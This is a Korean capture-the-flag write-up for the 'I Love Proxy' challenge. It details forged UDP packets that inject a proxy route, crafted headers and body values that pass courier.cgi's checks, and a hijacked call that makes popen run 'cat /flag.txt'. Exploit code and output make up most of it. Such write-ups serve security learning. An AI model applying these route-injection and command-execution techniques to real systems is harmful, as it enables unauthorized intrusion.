# I Love Proxy Writeup

## TL;DR

`edge-httpd`는 UDP 관리 패킷으로 라우팅 테이블을 갱신할 수 있다. 이를 이용해 `/hidden` prefix를 내부 `courier:7000`으로 연결한 뒤, `courier.cgi`의 숨겨진 `/hidden...` 경로 검증을 만족시키고 최종적으로 `popen("cat /flag.txt", "r")`가 호출되도록 payload를 구성한다.

```bash
python3 exploit.py 160.30.99.189 30026
```

```text
NHNC{I_L0ve_Pr0xy_Pr0xy_pr0xy_It_is_s0_wounderful_83cfd9f775094a2a9fdde70091112f29}
```

## Challenge Structure

`docker-compose.yml`에는 세 가지 주요 서비스가 있다.

```yaml
edge:
  ports:
    - "${PORT0}:8080"
    - "${PORT0}:5555/udp"

courier:
  environment:
    PORT: "7000"
  volumes:
    - /tmp/${ID:-i-love-proxy-local}/flag:/run/.proxy-seed:ro
```

외부에는 `edge`의 HTTP/TCP와 UDP 포트가 같은 포트로 노출된다. `courier`는 내부 서비스이고 `7000/tcp`만 expose되어 있다. 따라서 공격은 먼저 `edge`를 조작해 내부 `courier`로 프록시되게 만들어야 한다.

## Edge Route Injection

`edge-httpd`는 TCP HTTP 서버 외에 UDP listener를 갖고 있다. UDP packet은 두 종류가 있다.

첫 번째는 seed packet이다.

```text
magic(4) = 89 54 32 17
type(2)  = 03 36
nonce(4)
checksum(4)
```

checksum은 바이너리의 `0x401530` 함수와 같은 custom 32-bit checksum이다. seed packet이 통과하면 `edge` 내부 전역 token이 설정된다.

두 번째는 route install packet이다.

```text
magic(4)       = 89 54 32 17
type(2)        = 03 71
flags(1)       = 22
marker(1)      = 22
prefix_len(2)
upstream_len(2)
token(4)
encoded_prefix
encoded_upstream
checksum(4)
```

`encoded_prefix`와 `encoded_upstream`은 다음 방식으로 XOR 인코딩된다.

```python
def edge_encode(data, key):
    out = bytearray()
    x = 0x31
    for b in data:
        out.append(b ^ x ^ key)
        x = (x + 0x0D) & 0xFF
    return bytes(out)
```

우리는 다음 route를 등록한다.

```text
/hidden -> courier:7000
```

이후 HTTP 요청 경로가 `/hidden`으로 시작하면 `edge`가 내부 `courier:7000`으로 그대로 전달한다.

## Courier CGI Path

`courier.cgi`는 일반 `/flag.txt`, `/admin/flag`, `/flag` 접근을 막는다.

```text
flag export requires render worker approval
```

대신 숨겨진 advanced path가 있다. 경로 suffix hash 검사를 만족해야 하고, 사용한 path는 다음과 같다.

```python
path = b"/hidden\xf1M\xe5"
```

이 값은 `suffix_hash_is(path, 10, 0x26045b27)` 조건을 만족한다.

## Header State

`courier.cgi`의 `analyze_headers`는 헤더 이름을 normalize한 뒤 32개 bucket에 분산하고 duplicate 상태를 만든다. exploit은 다음 상태를 맞춘다.

```text
bucket = 17
maxdup = 34
ok     = 1
a      = 0
b      = 1
```

이를 위해 HTTP header는 대략 다음 형태가 된다.

```http
GET /hidden\xf1M\xe5 HTTP/1.1
Host: A...(0x558 bytes)...<12 hex>:
ipcppln: raw
x4: z
x4: z
...
x4: z
Content-Length: 768
```

`ipcppln: raw`는 두 번째 approval flag만 켜기 위해 사용한다. `x4: z`를 35개 넣어 duplicate bucket 조건을 만족시킨다.

`Host`의 마지막 12 hex는 `cgid`와 `courier.cgi` 양쪽의 token 계산이 같아지도록 맞춘다.

```python
host_hex = ((cl << 7) ^ seed ^ 0x5353495F504F5354) & 0xFFFFFFFFFFFF
```

## Body Constraints

`cgid`는 CGI 환경을 구성하기 전에 body 일부를 검사한다.

중요 조건은 다음과 같다.

```text
Content-Length > 0xef
Host length before ':' > 0x563
Host prefix == "A" * 0x558
body[0x49:0x51] == 0x58
body[0x58:0x60] == 0x58
body[0xd0:0xd8] == 0xf8
```

또한 `CGI_STACK_STAGE`로 전달되는 값과 `courier.cgi` 내부에서 다시 계산하는 값이 같아야 한다. exploit에서는 `q80`, `q88`, `q90`, `qd0`, `qd8`, `qe0`, `host_hex`, `fnv32(head)`를 조합해 두 token 식을 일치시킨다.

```python
q80 = key ^ 0x9C8E949AA062989E
q88 = key ^ 0x01A00000
q90 = key ^ rol(((seed & 0xFFFFFFFF) ^ (marker_cookie(st) & 0xFFFFFFFF)), 17)
qd0 = 0xF8
qd8 = int.from_bytes(b"GILA_TER", "little")
qe0 = int.from_bytes(b"1_METSYS", "little")
```

## Reaching `popen`

`courier.cgi`의 `run_filter`는 동적으로 `popen`, `pclose`, mode `"r"`를 unpack하고 다음처럼 동작한다.

```c
p = popen(command, "r");
fread(..., p);
```

따라서 최종 payload에 들어갈 문자열은 파일명이 아니라 shell command여야 한다.

```python
command = b"cat /flag.txt"
```

명령 문자열은 `tape_stream`으로 byte 단위 인코딩되고 checksum을 맞춰야 한다.

```python
for i, ch in enumerate(command):
    ts = tape_stream(st, seed, i, len(command)) & 0xFF
    v = ch ^ ts ^ ((0x17 * i - 0x59) & 0xFF)
    chk = (((chk ^ ((v + ts) & 0xFFFFFFFF)) * 0x1000193) & 0xFFFFFFFF)
    chk ^= chk >> 13
```

마지막으로 call target이 `run_filter` 주소 `0x4022ac`가 되도록 `q14e`를 역산한다.

```python
target = 0x4022AC
rot = ((chk ^ len(command) ^ st["tag"] ^ (seed & 0xFFFFFFFF)) & 0x1F) + 0xD
q14e = ror(m, 17) ^ ((rol((target ^ m), rot) - 0xE9A9984E61C88607) & MASK)
```

## Exploit Flow

전체 흐름은 다음과 같다.

1. UDP seed packet 전송
2. UDP route packet으로 `/hidden -> courier:7000` 등록
3. `/hidden\xf1M\xe5` HTTP request 전송
4. `edge`가 request를 내부 `courier:7000`으로 forward
5. `cgid`가 CGI env와 `CGI_STACK_STAGE` 구성
6. `courier.cgi` hidden path와 body verifier 통과
7. `popen("cat /flag.txt", "r")` 실행
8. response body로 flag 획득

## Reproduction

로컬 도커:

```bash
COMPOSE_PROJECT_NAME=iloveproxy PORT0=18080 SUBNET0=172.31.77.0/24 ID=i-love-proxy-local docker compose up -d --build
python3 exploit.py 127.0.0.1 18080
```

결과:

```text
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 22
X-Node: r7
Connection: close

NHNC{LOCAL_TEST_FLAG}
```

원격:

```bash
python3 exploit.py 160.30.99.189 30026
```

결과:

```text
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 83
X-Node: r7
Connection: close

NHNC{I_L0ve_Pr0xy_Pr0xy_pr0xy_It_is_s0_wounderful_83cfd9f775094a2a9fdde70091112f29}
```
